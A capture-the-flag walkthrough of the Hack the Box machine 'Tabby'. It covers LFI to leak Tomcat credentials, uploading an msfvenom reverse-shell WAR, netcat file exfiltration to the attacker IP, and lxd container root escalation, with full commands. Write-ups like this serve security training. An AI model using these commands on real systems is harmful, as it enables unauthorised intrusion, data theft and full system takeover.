# Hack the Box - Tabby

```CSS
Machine IP: 10.10.10.194 - Linux

```

---

```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.194 -T4 --min-rate 1000 -oN ports.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 11:08 IST
Nmap scan report for 10.10.10.194
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/22%OT=22%CT=1%CU=42207%PV=Y%DS=2%DC=I%G=Y%TM=646B001
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.91 seconds
```

```CSS
▶ nmap -sC -sV -p 22,80,8080 10.10.10.194 -oN services.nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 11:10 IST
Nmap scan report for 10.10.10.194
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 453c341435562395d6834e26dec65bd9 (RSA)
|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
```

---

# Port 80
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bb960e94-7b85-470f-8501-04813c7744df)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/a1ad3174-c498-4e0b-afc7-11faaf051616)
 
- Add the domain name `megahosting.htb` to the `/etc/hosts` file.
```CSS
▶ sudo -- sh -c "echo '10.10.10.194 megahosting.htb' >> /etc/hosts"
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/028519af-034e-4a45-993d-937fa894b7e1)

---

## Local File Inclusion (LFI)
We notice that we are being redirected to http://megahosting.htb/news.php?file=statement. It's worth noting that `statement` seems to be a filename passed as input to the parameter `file` of the page news.php . Let's check if this is vulnerable to Local File Inclusion (LFI), by trying to load the `/etc/passwd` file.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/afb98396-df84-4b56-b9ef-ce367446f0f7)

---

# Port 8080
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bb40c443-61df-487a-afdb-2559da6a6ee6)

---

### Content Discovery
Brute-force the URL path to look for some common hidden directories and files.
```CSS
▶ gobuster dir --url http://megahosting.htb:8080 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --threads 25
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/230e9c6b-b14c-4504-81aa-5dce91f80bd1)
Scanning reveals the well-known Tomcat `/manager` page. This is a default page that allows users to manage web applications.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2db1b182-901d-42aa-8e29-4770a7036509)
Tomcat's manager page requires authentication. Attempting to log in with common credentials like admin / admin is not successful.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b8d36d51-f02c-4ba2-af1f-730dd251cf30)
However, on clicking cancel we get a 401 Unauthorized message. This page reveals that the credentials are in the file `conf/tomcat-users.xml`. 

Navingating to the location of the `tomcat-users.xml` using the LFI as mentioned, returns a blank page.

Checking if the file `tomcat-users.xml` is located in a different path inside Tomcat's default installation directory.
- Tomcat default installation directory: `/usr/share/tomcat9/`.
- Default location of `tomcat-users.xml`: `etc/tomcat-users.xml`.

The final path should be: `/usr/share/tomcat9/etc/tomcat-users.xml`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c5629bff-e6c1-4aff-9036-8681fa3cdf40)

The file contains the credentials `tomcat /$3cureP4s5w0rd123!`.
As the roles xml attribute shows that this user is a member of admin-gui and manager-script . The manager-gui role that allows access to the /manager page is not assigned.

Brute-force the URL path `/manager/` to look for some common hidden directories and files.
```CSS
▶ gobuster dir --url http://megahosting.htb:8080/manager --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --threads 25
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/992d8893-58ec-4b66-888b-8968af93f140)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4f0c0678-6876-453b-92d0-76be836774fa)

---

# FootHold
### Tomcat Hostmanager App -- Text Interface

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/be4402eb-551e-4078-9f5b-cb2b3fcf7c15)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/92f28d3e-5c14-4f78-b315-a6f3efeead26)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1553e220-3e63-4dfb-8c07-66e948dfe48c)

#### Tomcat - List Available Hosts
```CSS
▶ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/list
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/42031ecc-31dd-4de8-951b-45e6f289a28d)
This is successful. It is also well-known that Tomcat deploys Java web applications. Check if a project can be deployed using the text interface.

---

#### Tomcat - Deploy A New Application Archive (WAR) Remotely

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d59e8d16-7194-467c-acf5-414070103283)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cd72da1d-5248-4869-af37-051ddbb153c8)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/032ae345-7ee6-42e3-b0fc-f6987c9c8475)
According to this, it is possible to create a war file and deploy it to the server. A war file is an archived Java application.

### Generate Reverse Shell
```CSS
▶ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=31337 -f war > shell.war
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f44669aa-d4ae-48e7-836b-7518d8d00c94)

#### Deploy the Shell
```CSS
▶ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/hardyboy --upload-file shell.war
```
#### Setup Netcat Listener
```CSS
▶ nc -nlvvp 31337
```
#### Trigger the Shell
```
▶ curl http://megahosting.htb:8080/hardyboy/
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c096b735-8537-416a-b909-c2f654bb309e)

Shell Upgrade:
```CSS
▶ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
---

### Lateral Movement

Enumeration of the directories and files reveals the archive `/var/www/html/16162020_backup.zip` , that is owned by the user `ash`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/021ebaaa-fc5f-4cea-bbff-000c5f6d6a39)

---

#### Backup ZIP Archive
Trying to unzip this returns a message prompting for a password.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bf4b9a47-9b9c-40bd-8c07-777750af997b)

---

#### Exfiltration
Exfiltrate the `16162020_backup.zip` file to attacker machine using `netcat`.

Setup Netcat Listener:
```CSS
▶ nc -lnvp 443 > 16162020_backup.zip
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e36ef408-053f-4638-97b6-ef3a7867d152)

Transfer the file:
```CSS
▶ cat 16162020_backup.zip | nc 10.10.14.24 443
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1f58b767-35b3-48c6-8d48-11b386aeaaab)

Match MD5:
```CSS
▶ md5sum 16162020_backup.zip
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b826db79-25d4-4d78-aa22-926639d73bc1)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/32ab9b04-e338-4963-8aa2-f692ba218f59)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/813d4c0c-8f08-472f-8326-ee27ee3f9349)

```CSS
tomcat@tabby:/dev/shm$ su - ash
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/68fa825a-3243-45c9-b523-3fa33baf55b3)

----

# Privilege Escalation

User enumeration reveals that the current user `ash` is a member of the `lxd` group.
```CSS
ash@tabby:~$ groups
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/9411a95e-0931-419c-a87e-29754e8508b1)

## Linux Daemon (LXD)
The `lxd` (Linux Daemon) is a system container manager, that controls the `lxc` (Linux Container). The Linux container is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user `ash` to create a privileged container and then use it to mount the host filesystem. To achieve this, download an Alpine image, and then upload it to the remote machine.

### Alpine
Download and build the `Alpine` image locally.
 - https://github.com/saghul/lxd-alpine-builder.git

```CSS
▶ git clone https://github.com/saghul/lxd-alpine-builder.git
▶ cd lxd-alpine-builder/
▶ ./build-alpine
```

#### Upload Alpine
Start a local python server.
```CSS
▶ python -m http.server
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e673ea5a-fce2-4eee-9e61-ee168ced901e)

```CSS
▶ wget http://10.10.14.24:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38061230-630a-458b-895e-54ca44c41868)

Initiate `lxd`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8a61ec15-92d5-4528-a663-1146e845aee6)

Import the Alpine Image.
```CSS
ash@tabby:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f0d6c555-f546-48c8-85bd-e40c410c57eb)

Check Import.
```CSS
ash@tabby:~$ lxc image list
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d2db9947-159b-4a4e-b24c-d7a272029b6c)

Make the container privileged, and mount the filesystem, before starting the container.
```CSS
ash@tabby:~$ lxc init alpine mycontainer -c security.privileged=true
Creating mycontainer

ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer

ash@tabby:~$ lxc start mycontainer
lxc start mycontainer
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/83afa919-e4ad-43ac-b2f2-e2fd54534c69)

Access the container.
```CSS
ash@tabby:~$ lxc exec mycontainer /bin/sh
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7bf7d9cc-2a38-41f3-852b-c894d4e67c3f)

Found Root SSH Key
```CSS
cd /mnt/root/root/.ssh
/mnt/root/root/.ssh # cat id_rsa
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/84d66806-db7b-40b1-9dbb-4db934da4857)

Copy the Key and assign appropriate permissions.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f632216a-a564-40f7-9eda-21d662e339a6)

SSH as Root
```CSS
▶ ssh -i id_rsa root@10.10.10.194
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cfdacd7c-2ec8-4806-ad8d-fbb260248b89)

---
